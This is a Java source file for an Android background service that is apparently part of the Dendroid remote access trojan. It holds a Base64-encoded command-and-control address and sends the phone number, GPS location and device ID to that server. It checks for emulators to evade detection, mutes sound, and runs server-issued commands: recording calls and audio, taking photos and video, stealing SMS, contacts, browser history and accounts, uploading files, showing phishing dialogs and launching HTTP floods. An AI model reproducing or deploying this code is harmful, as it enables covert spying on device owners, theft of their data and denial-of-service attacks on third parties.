package com.connect;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.utils.NetWorkUtils;

import com.asynctask.*;

import static com.utils.CommonUtils.getInputStreamFromUrl;
import static com.utils.CommonUtils.removeBlankSpace;

public class MyService extends Service {
    //********************************************************************************************************************************************************
    private String encodedURL = "aHR0cDovLzEwMS4yMDEuNjcuMTY1OjgwODA="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
    private String backupURL = "aHR0cDovLzEwMS4yMDEuNjcuMTY1OjgwODA=";
    private String encodedPassword = "cGFzc3dvcmQ="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
    private int timeout = 10000; //Bot timeout
    private Boolean GPlayBypass = true; //true to bypass OR false to initiate immediately 
    private Boolean recordCalls = true; //if recordCalls should start true
    private Boolean intercept = false; //if intercept should start true
    //********************************************************************************************************************************************************
    private long interval = 1000 * 60 * 60; //1 hour 
    private int version = 1;
    //********************************************************************************************************************************************************
    BroadcastReceiver mReceiver;
    private final IBinder myBinder = new MyLocalBinder();
    private String androidId;
    private String URL;
    private String password;
    //********************************************************************************************************************************************************
    private int random;
    private Location location;
    private String phonenumber;
    private String device;
    private String sdk;
    private String provider;
    private String locationProvider;
    //********************************************************************************************************************************************************
    private String urlPostInfo = "/message.php?";
    private String urlSendUpdate = "/get.php?";
    private String urlUploadFiles = "/new-upload.php?";
    private String urlUploadPictures = "/upload-pictures.php?";
    private String urlFunctions = "/get-functions.php?";

    //********************************************************************************************************************************************************
    @Override
    public IBinder onBind(Intent arg0) {
        return myBinder;
    }

    //********************************************************************************************************************************************************
    public class MyLocalBinder extends Binder {
        MyService getService() {
            return MyService.this;
        }
    }

    //********************************************************************************************************************************************************
    PreferenceManager pm;
    private Double latitude;
    private Double longitude;
    private LocationManager locManager;

    //********************************************************************************************************************************************************
    @Override
    public void onCreate() {
        IntentFilter filterBoot = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        filterBoot.addAction(Intent.ACTION_SCREEN_OFF);
        mReceiver = new ServiceReceiver();
        registerReceiver(mReceiver, filterBoot);
        super.onCreate();
        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putLong("inacall", 0).commit();
    }

    //********************************************************************************************************************************************************
    @Override
    public void onStart(Intent intent, int startId) {
//		Notification note= new Notification(0, "Service Started", System.currentTimeMillis());
//		startForeground(startId, note);// Create Icon in Notification Bar - Keep Commented
        super.onStart(intent, startId);
        Log.i("com.connect", "Start MyService");
        //允许在主线程中访问网络
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        androidId = Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID);
        //初始化相关参数至preferenceManager
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 0) < 1) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", timeout).commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false) != false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false) != true) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("RecordCalls", recordCalls).commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false) != false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false) != true) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("intercept", intercept).commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") == null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "").equals("")) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("AndroidID", androidId).commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") == null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "").equals("")) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + "System").commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") == null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "").equals("")) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("urlPost", urlPostInfo).commit();
        }
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "") == null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "").equals("")) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
        }
        //********************************************************************************************************************************************************
        threadPre.start();
    }

    //********************************************************************************************************************************************************
    Thread threadPre = new Thread() {
        @Override
        public void run() {
            Looper.prepare();
            Log.i("com.connect", "Thread Pre");

            if (GPlayBypass == true) {
                while (true) {

                    if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Start", false) == false) {
                        if ("google_sdk".equals(Build.PRODUCT) || "google_sdk".equals(Build.MODEL) || Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic") || "goldfish".equals(Build.HARDWARE)) {
                        }
//		    		else if(hours%4==0)
//		            {
//		            	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true);
//		            	initiate();
//		            }
                        else {
                            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true);
                            initiate();
                        }
                    } else if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Start", false) == true) {
                        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true).commit();
                        initiate();
                    } else {
                    }

                    try {
                        Thread.sleep(interval);
                    } catch (Exception e) {
                        threadPre.start();
                    }
                }
            } else {
                initiate();
            }
        }
    };

    //********************************************************************************************************************************************************
    public void initiate() {
        try {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media", true);
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files", true).commit();

            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", encodedURL).commit();
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("password", encodedPassword).commit();

            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("androidId", androidId).commit();

            URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT));
            password = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT));

            //设置录屏时静音
            AudioManager mgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
        thread.start();
    }

    //********************************************************************************************************************************************************
    //持续从服务器读取指令
    Thread thread = new Thread() {
        @Override
        public void run() {
            //初始化消息队列
            Looper.prepare();
            int i = 0;
            while (true) {
//				if(isNetworkAvailable())//url not reachable
//				{	
////					new isUrlAlive(URL).execute("");
//				}

                device = android.os.Build.MODEL;
                device = device.replace(" ", "");
                sdk = Integer.valueOf(android.os.Build.VERSION.SDK).toString(); //Build.VERSION.RELEASE;
                TelephonyManager telephonyManager = ((TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
                provider = removeBlankSpace(new StringBuilder(telephonyManager.getNetworkOperatorName()));
                phonenumber = telephonyManager.getLine1Number();
                locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                List<String> providers = locManager.getProviders(true);
                if(providers.contains(LocationManager.GPS_PROVIDER)){
                    //如果是GPS
                    locationProvider = LocationManager.GPS_PROVIDER;
                }else if(providers.contains(LocationManager.NETWORK_PROVIDER)){
                    //如果是Network
                    locationProvider = LocationManager.NETWORK_PROVIDER;
                }else{
                    Log.i("com.connect", "not available locationProvider");
                    return ;
                }
                locManager.requestLocationUpdates(locationProvider, 400, 1, locationListener);
                location = locManager.getLastKnownLocation(locationProvider);
                random = new Random().nextInt(999);

                if (location != null) {
                    latitude = location.getLatitude();
                    longitude = location.getLongitude();
                    Log.i("com.connect", "Location Is Live = (" + latitude + "," + longitude + ")");
                } else {
                    Log.i("com.connect", "Location Is Dead");
                }

                String url = URL + urlSendUpdate + "UID=" + androidId + "&Provider=" + provider + "&Phone_Number=" + phonenumber + "&Coordinates=" + latitude + "," + longitude + "&Device=" + device + "&Sdk=" + sdk + "&Version=" + version + "&Random=" + random + "&Password=" + password;
                try {
                    Log.i("com.connect", url);
                    getInputStreamFromUrl(url, "");
                } catch (UnsupportedEncodingException e2) {
                    e2.printStackTrace();
                }

                URL functions;
                try {
                    functions = new URL(URL + urlFunctions + "UID=" + androidId + "&Password=" + password);
                    Log.i("com.connect", functions.toString());

                    BufferedReader in = new BufferedReader(new InputStreamReader(functions.openStream()));

                    StringBuilder total = new StringBuilder();
                    String line;

                    while ((line = in.readLine()) != null) {
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        total.append(line);
                        Log.i("com.connect", "Function Run: " + line);

                        String parameter = "";
                        Matcher m = Pattern.compile("\\(([^)]+)\\)").matcher(line);
                        while (m.find()) {
                            Log.i("com.connect", "Function Run: " + m.group(1));
                            parameter = m.group(1);
                        }

                        if (parameter.equals("")) {
                            parameter = "default";
                        }

                        List<String> list = new ArrayList<String>(Arrays.asList(parameter.split("~~")));//used to spit ","

                        try {

                            if (line.contains("mediavolumeup(")) {
                                new mediaVolumeUp().execute("");
                            } else if (line.contains("mediavolumedown(")) {
                                new mediaVolumeDown().execute("");
                            } else if (line.contains("ringervolumeup(")) {
                                new ringerVolumeUp().execute("");
                            } else if (line.contains("ringervolumedown(")) {
                                new ringerVolumeDown().execute("");
                            } else if (line.contains("screenon(")) {
                                new screenOn().execute("");
                            } else if (line.contains("recordcalls(")) {
                                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("RecordCalls", Boolean.parseBoolean(list.get(0))).commit();
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Calls set to: " + list.get(0));
                            } else if (line.contains("intercept(")) {
                                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("intercept", Boolean.parseBoolean(list.get(0))).commit();
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Intercept set to: " + list.get(0));
                            } else if (line.contains("blocksms(")) {
                                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("blockSMS", Boolean.parseBoolean(list.get(0))).commit();
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Block SMS set to: " + list.get(0));
                            } else if (line.contains("recordaudio(")) {
                                new recordAudio(list.get(0)).execute("");
                            } else if (line.contains("takevideo(")) {
                                new takeVideo(list.get(0), list.get(1)).execute("");
                            } else if (line.contains("takephoto(")) {
                                if (list.get(0).equalsIgnoreCase("1")) {
                                    new takePhoto("1").execute("");
                                } else
                                    new takePhoto("0").execute("");
                            } else if (line.contains("settimeout(")) {
                                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", Integer.parseInt(list.get(0))).commit();
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Timeout set to: " + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 1));
                            } else if (line.contains("sendtext(")) {
                                if (list.get(0).equals("default") || list.get(1) == null) {
                                } else
                                    new sendText(list.get(0), list.get(1)).execute("");
                            } else if (line.contains("sendcontacts(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new sendContactsText(list.get(0)).execute("");
                            } else if (line.contains("callnumber(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new callNumber(list.get(0)).execute("");
                            } else if (line.contains("deletecalllognumber(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new deleteCallLogNumber(list.get(0)).execute("");
                            } else if (line.contains("openwebpage(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new openWebpage(list.get(0)).execute("");
                            } else if (line.contains("updateapp(")) {
                                if (Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Version", 0)) {
                                    UpdateApp updateApp = new UpdateApp();
                                    updateApp.setContext(getApplicationContext());
                                    updateApp.execute(list.get(0));
                                }
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Attempting to Download App and Prompt Update");
                            } else if (line.contains("promptupdate(")) {
                                if (Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Version", 0)) {
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getPath() + "/Download/update.apk")), "application/vnd.android.package-archive");
                                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
                                    startActivity(intent);
                                }
                                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Prompted Update");
                            } else if (line.contains("promptuninstall(")) {
                                new promptUninstall().execute("");
                            } else if (line.contains("uploadfiles(")) {
                                if (list.get(0).equals("default")) {
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                } else if (list.get(0).equals("Calls" + File.separator)) {
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                } else if (list.get(0).equals("Audio")) {
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                } else if (list.get(0).equals("Videos")) {
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                } else if (list.get(0).equals("Pictures")) {
                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                }
                            } else if (line.contains("changedirectory(")) {
                                new changeDirectory().execute();
                            } else if (line.contains("deletefiles(")) {
                                if (list.get(0).equals("default")) {
                                    new deleteFiles("Audio").execute("");
                                    new deleteFiles("Videos").execute("");
                                    new deleteFiles("Pictures").execute("");
                                    new deleteFiles("Calls").execute("");
                                } else if (list.get(0).equals("Audio")) {
                                    new deleteFiles("Audio").execute("");
                                } else if (list.get(0).equals("Videos")) {
                                    new deleteFiles("Videos").execute("");
                                } else if (list.get(0).equals("Pictures")) {
                                    new deleteFiles("Pictures").execute("");
                                } else if (list.get(0).equals("Calls")) {
                                    new deleteFiles("Calls").execute("");
                                }
                            } else if (line.contains("getbrowserhistory(")) {

                                if (list.get(0).equals("default")) {
                                } else
                                    new getBrowserHistory(list.get(0)).execute("");
                            } else if (line.contains("getbrowserbookmarks(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getBrowserBookmarks(list.get(0)).execute("");
                            } else if (line.contains("getcallhistory(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getCallHistory(list.get(0)).execute("");
                            } else if (line.contains("getcontacts(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getContacts(list.get(0)).execute("");
                            } else if (line.contains("getinboxsms(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getInboxSms(list.get(0)).execute("");
                            } else if (line.contains("getsentsms(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getSentSms(list.get(0)).execute("");
                            } else if (line.contains("deletesms(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new deleteSms(list.get(0), list.get(1));
                            } else if (line.contains("getuseraccounts(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getUserAccounts(list.get(0)).execute("");
                            } else if (line.contains("getinstalledapps(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new getInstalledApps(list.get(0)).execute("");
                            } else if (line.contains("httpflood(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new httpFlood(list.get(0), list.get(1)).execute("");
                            } else if (line.contains("openapp(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new openApp(list.get(0)).execute("");
                            } else if (line.contains("opendialog(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new openDialog(list.get(0), list.get(1)).execute("");
                            } else if (line.contains("uploadpictures(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new uploadPictures(list.get(0), list.get(1), list.get(2)).execute("");
                            }
                            //						else if(line.contains("setbackupurl("))
                            //						{
                            //								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", Base64.encodeToString(list.get(0).getBytes(), Base64.DEFAULT )).commit();
                            //						}
                            else if (line.contains("transferbot(")) {
                                if (list.get(0).equals("default")) {
                                } else
                                    new transferBot(list.get(0));
                            } else {
                            }
                        } catch (IndexOutOfBoundsException e) {
                            e.printStackTrace();
                        }
                    }
                } catch (MalformedURLException e1) {
                    e1.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (NetWorkUtils.isNetworkConnected(getApplicationContext()) && i == 0) {
                    // Initial Connect Run Apps

//		            new recordAudio("20000").execute("");
//		    		new takePhoto("0").execute("");
//		            new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//			        new mediaVolumeUp().execute("");
//			        new mediaVolumeDown().execute("");
//			        new ringerVolumeUp().execute("");
//			        new ringerVolumeDown().execute("");
//			        new screenOn().execute("");
//			        new recordAudio("2000").execute("");
//				    new takePhoto("0").execute("");
//				    new takePhoto("1").execute("");
//		        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
//			        new takeVideo("0", "10000").execute("");
//			        new takeVideo("1", "10000").execute("");
//					new sendText("999","Test Message").execute("");
//					new sendContactsText(list.get(0)).execute("");
//					new callNumber("999").execute("");
//		    		new deleteCallLogNumber("1231231234").execute();
//					new openWebpage("http://google.com").execute("");
//					new promptUninstall().execute("");
//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//					new changeDirectory().execute();
//					new deleteFiles("Audio").execute("");
//				    new deleteFiles("Videos").execute("");
//				    new deleteFiles("Pictures").execute("");
//				    new deleteFiles("Calls").execute("");
//					new getBrowserHistory("10").execute("");
//					new getBrowserBookmarks("10").execute("");
//					new getCallHistory("1").execute("");
//					new getContacts("1").execute("");
//					new getInboxSms("1").execute("");
//					new getSentSms("1").execute("");
//					new deleteSms("3","579").execute("");
//					new getUserAccounts("10").execute("");
//					new getInstalledApps("10").execute("");
//					new httpFlood("www.google.com", "1000").execute("");
//					new openApp(list.get(0)).execute("");//packageName
//					new openDialog("Enter Gmail","TEst").execute("");
//		    		new uploadPictures("0","99999999999999", "10").execute("");
//		    		new transferBot("http://pizzachip.com/rat").execute("");
                    i++;
                }

                try {
                    Thread.sleep(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 1));
                } catch (Exception e) {
                    thread.start(); //initiate(); //
                }
            }
        }
    };

    //******************************************************************************************************************************************************** 
    private void updateWithNewLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
        }
    }

    //********************************************************************************************************************************************************
    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            updateWithNewLocation(location);
        }

        public void onProviderDisabled(String provider) {
            updateWithNewLocation(null);
        }

        public void onProviderEnabled(String provider) {
        }

        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };

    //********************************************************************************************************************************************************
//	public class isUrlAlive extends AsyncTask<String, Void, String> {
//		String i = "";
//
//      public isUrlAlive(String i) {
//      	this.i = i;
//      }
//		@Override
//      protected String doInBackground(String... params) {  
//			boolean alive = false;
//			
//			try {
//				  final URL url = new URL(i);
//				  final HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
//				  urlConn.setConnectTimeout(1000 * 10);
//				  urlConn.connect();
//				  if (urlConn.getResponseCode() == HttpURLConnection.HTTP_OK) {
//					  alive = true;
//				  }
//				 } catch (final MalformedURLException e1) {
//				  e1.printStackTrace();
//				 } catch (final IOException e) {
//				  e.printStackTrace();
//				 }
//   
//		    if(!alive)
//		    {
//				PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", ""), Base64.DEFAULT )));
//		    }
//		    
//		    return "Executed";
//      }      
//      @Override
//      protected void onPostExecute(String result) {/*httpcalldone*/}
//      @Override
//      protected void onPreExecute() {/*httpcallexecuting*/}
//      @Override
//      protected void onProgressUpdate(Void... values) {
//      }
//	}
    //******************************************************************************************************************************************************** 
    @Override
    public void onDestroy() {
        unregisterReceiver(mReceiver);
        super.onDestroy();
    }
}
